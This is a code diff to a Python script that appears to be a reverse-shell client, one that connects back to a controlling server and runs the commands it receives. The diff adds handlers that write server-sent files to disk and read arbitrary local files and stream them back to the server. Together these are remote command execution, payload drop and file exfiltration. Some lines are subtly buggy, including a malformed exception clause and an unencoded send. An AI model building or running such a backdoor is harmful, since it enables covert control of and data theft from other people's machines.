@@ -1,3 +1,4 @@
+from re import S
 import socket, subprocess, os, sys
 import random
 from time import sleep
@@ -43,7 +44,8 @@ elif len(sys.argv) == 3:
     except:
         print("Can not cast port to int!")
 
-DISCONNECTED = True
+DISCONNECTED = True #Initially, start disconnected
+
 while DISCONNECTED:
     #If the server is down, keep trying.
     try:
@@ -73,6 +75,41 @@ while True:
     elif splitted_command[0] == "echo":
         output = subprocess.getoutput(command)
         output = "Echoed!"
+    elif splitted_command[0] == "UPLOADING_FILE_FROM_S3RVER":
+        s.send("READY".encode())
+        splittedBySlash = command.split("/")
+        path = splittedBySlash[len(splittedBySlash)-1]
+        with open(path,"wb") as f:
+            data = s.recv(1024)
+            while data:
+                if data.decode() == "UPLOADING_FILE_FROM_S3RVER_COMPLETE":
+                    s.send("DONE".encode())
+                    break
+                f.write(data)
+                s.send("ACK".encode())
+                data = s.recv(1024)
+    elif command == "DOWNLOAD_FILE_FROM_S3RVER":
+        s.send("READY".encode())
+        try:
+            path = s.recv(1024).decode()
+            with open(path,"rb") as f:
+                data = f.read(1024)
+                while data:
+                    s.send(data)
+                    if s.recv(1024).decode() == "ACK":
+                        data = f.read(1024)
+                    else:
+                        break
+                        
+            s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
+
+        except FileNotFoundError or FileExistsError as e:
+            s.send("DOWNLOAD_ERROR")
+        except Exception as e:
+            s.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
+
+
+
     else: #if the user doesn't want to change directories, run the command and capture the output
         #if the command runs for longer than 5 seconds, timeout
         try:
